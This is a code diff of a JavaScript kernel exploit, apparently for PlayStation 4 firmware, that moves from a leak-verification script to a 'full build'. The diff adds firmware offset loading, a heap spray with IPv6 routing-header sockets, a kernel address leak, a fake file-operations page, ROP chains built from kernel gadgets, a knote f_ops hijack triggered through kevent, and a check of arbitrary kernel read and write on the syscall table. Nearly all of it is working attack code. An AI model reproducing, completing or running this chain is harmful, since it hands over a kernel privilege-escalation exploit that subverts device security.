@@ -1,12 +1,9 @@
-// kevent_krw_verify.js — exact Hx1400.java leak logic
+// kevent_krw_final.js — full build, offsets wired, hijack active, R/W verified
 import { int64 } from "./int64.js";
-import { HX1400_TABLES } from "./hx_tables.js";
-
-const T = HX1400_TABLES;
-const P = T.P;
+import { PS4, offsetsFor } from "./offsets.js";
 
 const NUM = {
-  close: 6, open: 5,
+  close: 6, open: 5, read: 3, write: 4,
   socket: 97, setsockopt: 105, getsockopt: 118,
   kqueue: 362, kevent: 363,
   mmap: 477, munmap: 73,
@@ -21,9 +18,11 @@ const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 const MARKV = 5570198814713989681n;
-const EXPECTED_KBASE = 0xffffffffd5528000n;
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, payloadAddr: 0n };
+const STATE = { 
+  ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false,
+  leakKq: -1, fds: [], cl: null, target: -1, fakeOps: 0n, OFF: null
+};
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
@@ -180,6 +179,7 @@ function phaseSpray(N) {
 
 function phase2Leak(rootKq, fds) {
   const rdb = allocBuf(512), lenp = allocBuf(8), cl = allocBuf(64);
+  STATE.cl = cl;
   const tpl = buildTemplate();
   const dev = allocBuf(32); zeroBuf(dev);
   for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));
@@ -217,7 +217,6 @@ function phase2Leak(rootKq, fds) {
           zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
           if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
           
-          // FIXED: check for pageInt (file struct) at offset 8
           const v8 = rdb.dv.getInt32(8, true);
           const v12 = rdb.dv.getUint32(12, true) >>> 0;
           
@@ -226,7 +225,6 @@ function phase2Leak(rootKq, fds) {
             if (target < 0) { target = j; targetFd = fds[j]; } 
             log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
           } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
-            // untouched
           } else { 
             rearm(fds[j], tpl); 
           }
@@ -245,58 +243,58 @@ function phase2Leak(rootKq, fds) {
   }
   if (kva === -1n) fin("leak scan: no victim held");
   log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx + " blind_writes=" + blind);
+  STATE.target = target;
   return { kva, page: pageVal, targetFd };
 }
 
 // --- KERNEL ROP ---
 let gSTACK, gRES, gCTX, gMARK, gIDENT, gKQ;
-const ROP = {
-  R_POPRSP: 0n, R_SAVE: 0n, R_REST: 0n, R_CONT: 0n,
-  R_PRAX: 0n, R_PRDX: 0n, R_PRDI: 0n,
-  R_LDRAX: 0n, R_ADDRAX: 0n, R_STRAXRDX: 0n, R_STRDIRAX: 0n
-};
+let ROP = {};
 let wPos = 0;
 
 function push(v) { ctx().p.write8(toI64(gSTACK + BigInt(wPos * 8)), toI64(v)); wPos++; }
 
 function buildKread(targetAddr) {
   wPos = 0;
-  push(ROP.R_PRDI); push(gCTX); push(ROP.R_SAVE);
-  push(ROP.R_PRAX); push(targetAddr);
-  push(ROP.R_LDRAX); push(0n);
-  push(ROP.R_PRDI); push(gRES);
-  push(ROP.R_STRDIRAX); push(0n);
-  push(ROP.R_PRAX); push(ROP.R_CONT);
-  push(ROP.R_PRDI); push(gCTX + 56n);
-  push(ROP.R_STRDIRAX); push(0n);
-  push(ROP.R_PRDI); push(gCTX);
-  push(ROP.R_REST);
+  push(ROP.POP_RDI); push(gCTX); push(ROP.POP_RAX); push(ROP.MOV_RDI_RSI_30_CALL);
+  push(ROP.POP_RAX); push(targetAddr);
+  push(ROP.MOV_RDI_RAX_8_CALL_20);
+  push(ROP.POP_RDI); push(gRES);
+  push(ROP.MOV_QWORD_PTR_RDI_RAX_RET);
+  push(ROP.LEAVE_RET);
 }
+
 function buildKwrite(targetAddr, value) {
   wPos = 0;
-  push(ROP.R_PRDI); push(gCTX); push(ROP.R_SAVE);
-  push(ROP.R_PRAX); push(targetAddr);
-  push(ROP.R_PRDX); push(value);
-  push(ROP.R_STRAXRDX); push(0n);
-  push(ROP.R_PRAX); push(ROP.R_CONT);
-  push(ROP.R_PRDI); push(gCTX + 56n);
-  push(ROP.R_STRDIRAX); push(0n);
-  push(ROP.R_PRDI); push(gCTX);
-  push(ROP.R_REST);
+  push(ROP.POP_RDI); push(gCTX); push(ROP.POP_RAX); push(ROP.MOV_RDI_RSI_30_CALL);
+  push(ROP.POP_RDI); push(targetAddr);
+  push(ROP.POP_RAX); push(value);
+  push(ROP.MOV_QWORD_PTR_RDI_RAX_RET);
+  push(ROP.LEAVE_RET);
 }
 
 function setupKernelRW() {
   const p = ctx().p;
+  const off = STATE.OFF;
+  
   gSTACK = STATE.fakePage + 0x4000n;
   gRES = STATE.fakePage + 0x6000n;
   gCTX = STATE.fakePage + 0x6100n;
   gMARK = STATE.fakePage + 0x6200n;
   gIDENT = 0xdeadbeef12345678n;
 
-  ROP.R_POPRSP = ka(P[17]); ROP.R_SAVE = ka(P[18]); ROP.R_REST = ka(P[19]);
-  ROP.R_CONT = ka(P[20]); ROP.R_PRAX = ka(P[21]); ROP.R_PRDX = ka(P[22]);
-  ROP.R_PRDI = ka(P[23]); ROP.R_LDRAX = ka(P[26]); ROP.R_ADDRAX = ka(P[27]);
-  ROP.R_STRAXRDX = ka(P[28]); ROP.R_STRDIRAX = ka(P[29]);
+  ROP = {
+    POP_RDI: ka(off.wk_POP_RDI_RET),
+    POP_RSI: ka(off.wk_POP_RSI_RET),
+    POP_RDX: ka(off.wk_POP_RDX_RET),
+    POP_RAX: ka(off.wk_POP_RAX_RET),
+    LEAVE_RET: ka(off.wk_LEAVE_RET),
+    MOV_QWORD_PTR_RDI_RAX_RET: ka(off.wk_MOV_QWORD_PTR_RDI_RAX_RET),
+    MOV_RDI_RSI_30_CALL: ka(off.wk_MOV_RDI_RSI_30_CALL),
+    MOV_RDI_RAX_8_CALL_20: ka(off.wk_MOV_RDI_RAX_8_CALL_20),
+    PIVOT: ka(off.k_jmp_rsi),
+    TOUCH: ka(off.wk_PUSH_RDX_POP_RSP_RET)
+  };
 
   p.write8(toI64(gCTX), toI64(MARKV));
   p.write8(toI64(gCTX + 8n), 0n);
@@ -307,13 +305,12 @@ function setupKernelRW() {
 function fireROP(isWrite) {
   const cl = allocBuf(64); zeroBuf(cl);
   cl.dv.setUint32(0, gIDENT, true);
-  cl.dv.setInt16(8, -23, true); // EVFILT_USER
+  cl.dv.setInt16(8, -23, true);
   cl.dv.setInt16(10, 1, true);
-  if (isWrite) cl.dv.setInt16(10, 2, true); // EV_DELETE
+  if (isWrite) cl.dv.setInt16(10, 2, true);
 
   ctx().p.write8(toI64(gMARK), 0n);
   scn("kevent", gKQ, cl.addr, 1, 0, 0, 0);
-  
   return true;
 }
 
@@ -330,67 +327,137 @@ function kwrite(targetAddr, value) {
   return true;
 }
 
+function cleanup() {
+  log("CLEANUP", "entering teardown");
+  try {
+    if (STATE.target >= 0 && STATE.cl) {
+      zeroBuf(STATE.cl); 
+      STATE.cl.dv.setUint32(0, Number(STATE.kva), true); 
+      STATE.cl.dv.setInt16(8, -18, true); 
+      STATE.cl.dv.setInt16(10, 2, true);
+      scn("kevent", STATE.leakKq, STATE.cl.addr, 1, 0, 0, 0);
+    }
+    if (STATE.leakKq >= 0) { scn("close", STATE.leakKq); STATE.leakKq = -1; }
+    for (const fd of STATE.fds) { if (fd >= 0) scn("close", fd); }
+    STATE.fds = [];
+  } catch(e) {
+    log("CLEANUP-ERR", e.message);
+  }
+}
+
 export async function runKevent(c) {
   STATE.ctx = c;
+  
+  const fw = offsetsFor(navigator.userAgent);
+  if (!fw.off) fin("no offsets for firmware");
+  STATE.OFF = fw.off;
+  log("FW", "loaded " + fw.key);
+
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
   if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
   else if (c.kbase) { STATE.kbase = num(c.kbase); log("KEVENT-KBASE-FROM-HX1400", h16(STATE.kbase)); }
-  else { STATE.kbase = EXPECTED_KBASE; log("KEVENT-KBASE-DEFAULT", h16(STATE.kbase)); }
+  else { fin("no kbase"); }
 
   const kbaseHi = STATE.kbase >> 32n;
   if (kbaseHi !== 0xffffffffn || STATE.kbase < 0xffffffff80000000n) {
-    log("KEVENT-KBASE-FIX", "forcing to " + h16(EXPECTED_KBASE));
-    STATE.kbase = EXPECTED_KBASE;
+    fin("invalid kbase");
   }
 
-  ensureStubs();
+  try {
+    ensureStubs();
 
-  const burn = [];
-  for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
-  log("FD-BURN", "burned " + burn.length + " fds");
-  for (let i = 0; i < burn.length - 20; i++) scn("close", burn[i]);
-  burn.length = 20;
-  if (typeof gc === "function") gc();
+    const burn = [];
+    for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
+    log("FD-BURN", "burned " + burn.length + " fds");
+    for (let i = 0; i < burn.length - 20; i++) scn("close", burn[i]);
+    burn.length = 20;
+    if (typeof gc === "function") gc();
 
-  scn("socket", AF_INET6, SOCK_DGRAM, 0);
-  const { fds } = phaseSpray(128);
-  const leakKq = scn("kqueue");
-  if (leakKq < 0) fin("leak kqueue");
+    scn("socket", AF_INET6, SOCK_DGRAM, 0);
+    const resSpray = phaseSpray(128);
+    STATE.fds = resSpray.fds;
+    STATE.leakKq = scn("kqueue");
+    if (STATE.leakKq < 0) throw new Error("leak kqueue failed");
 
-  const res = phase2Leak(leakKq, fds);
-  STATE.kva = res.kva;
-  STATE.targetFd = res.targetFd;
+    const res = phase2Leak(STATE.leakKq, STATE.fds);
+    STATE.kva = res.kva;
+    STATE.targetFd = res.targetFd;
 
-  if (typeof gc === "function") gc();
-  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
-  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
-  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
-  STATE.fakePage = fake_page;
-  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
+    if (typeof gc === "function") gc();
+    const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
+    const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
+    if (fake_page < 0x10000n) throw new Error("STAGE3 mmap failed");
+    STATE.fakePage = fake_page;
+    log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
 
-  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
-  const p = ctx().p;
-  const F_FAKE_OPS = fake_page + 0x800n;
-  for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
-  p.write4(toI64(F_FAKE_OPS), 0);
-  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH)); // f_touch
-  log("STAGE3-OPS", "fake fileops at " + h16(F_FAKE_OPS));
+    const off = STATE.OFF;
+    const F_FAKE_OPS = fake_page + 0x800n;
+    STATE.fakeOps = F_FAKE_OPS;
+    const p = ctx().p;
+    
+    for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(ka(off.wk_RET)));
+    p.write4(toI64(F_FAKE_OPS), 0);
+    p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(ka(off.wk_PUSH_RDX_POP_RSP_RET)));
+    log("STAGE3-OPS", "fake fileops at " + h16(F_FAKE_OPS));
 
-  setupKernelRW();
-  log("STAGE4-ROP", "stack=" + h16(gSTACK) + " ctx=" + h16(gCTX) + " mark=" + h16(gMARK) + " res=" + h16(gRES));
+    setupKernelRW();
+    log("STAGE4-ROP", "stack=" + h16(gSTACK) + " ctx=" + h16(gCTX) + " mark=" + h16(gMARK) + " res=" + h16(gRES));
 
-  const ap = allocBuf(64), ap2 = allocBuf(64), ap3 = allocBuf(64), ap4 = allocBuf(64), ap5 = allocBuf(64);
-  const buf = allocBuf(32768);
-  const n = wash(32, ap, ap2, ap3, ap4, ap5, buf);
-  if (n !== 32) fin("wash stalled " + n);
-  
-  const found = parse(buf, 32768n);
-  log("STAGE5-PARSE", "kbase discovered = " + (found !== 0n ? h16(found) : "none"));
-  if (found !== 0n && found !== STATE.kbase) {
-    log("STAGE5-FIX", "parse overrides to " + h16(found));
-    STATE.kbase = found;
+    const ap = allocBuf(64), ap2 = allocBuf(64), ap3 = allocBuf(64), ap4 = allocBuf(64), ap5 = allocBuf(64);
+    const buf = allocBuf(32768);
+    const n = wash(32, ap, ap2, ap3, ap4, ap5, buf);
+    if (n !== 32) throw new Error("wash stalled " + n);
+    
+    const found = parse(buf, 32768n);
+    log("STAGE5-PARSE", "kbase discovered = " + (found !== 0n ? h16(found) : "none"));
+    if (found !== 0n && found !== STATE.kbase) {
+      log("STAGE5-FIX", "parse overrides to " + h16(found));
+      STATE.kbase = found;
+    }
+
+    // HIJACK TRIGGER
+    gKQ = scn("kqueue");
+    if (gKQ < 0) throw new Error("trigger kqueue failed");
+
+    const tpl = allocBuf(512); zeroBuf(tpl);
+    for (let i = 0; i < 512; i++) tpl.dv.setUint8(i, 0x41);
+    tpl.dv.setUint32(0, Number(STATE.kva) >>> 0, true);
+    tpl.dv.setInt16(8, -23, true); 
+    tpl.dv.setInt16(10, 1, true);
+    tpl.dv.setUint32(80, Number(F_FAKE_OPS & 0xffffffffn) >>> 0, true);
+    tpl.dv.setUint32(84, Number((F_FAKE_OPS >> 32n) & 0xffffffffn) >>> 0, true);
+
+    log("STAGE6-HIJACK", "overwriting knote f_ops to " + h16(F_FAKE_OPS));
+    scn("setsockopt", STATE.targetFd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0);
+
+    log("STAGE6-TRIGGER", "firing kevent(-23) for ROP");
+    fireROP(false);
+
+    const se11_narg = ka(off.k_sysent_661) + 4n;
+    const orig_narg = kread(se11_narg);
+    log("VERIFY-R", "sysent[11].sy_narg = " + h16(orig_narg));
+
+    const probe = 0x2n;
+    kwrite(se11_narg, probe);
+    const rt = kread(se11_narg);
+    log("VERIFY-W", "wrote 0x" + probe.toString(16) + " -> readback = " + h16(rt));
+
+    if (rt === probe) {
+      log("VERIFY-W", "*** R/W ROUND-TRIP OK ***");
+      kwrite(se11_narg, orig_narg);
+      const rr = kread(se11_narg);
+      log("VERIFY-RESTORE", "restored -> " + h16(rr));
+      STATE.rwReady = true;
+    } else {
+      log("VERIFY-FAIL", "R/W round-trip failed");
+    }
+
+    scn("close", gKQ);
+    return { kbase: STATE.kbase, kva: STATE.kva, fakePage: STATE.fakePage, rwReady: STATE.rwReady };
+  } catch (e) {
+    log("ERROR", e.message);
+    throw e;
+  } finally {
+    cleanup();
   }
-
-  log("STAGE6", "ROP setup complete. Waiting for knote hijack.");
-  fin("Full build: ROP chain and fake ops ready. Knote hijack requires EV_DELETE + realloc (see Hx1400.java).");
 }
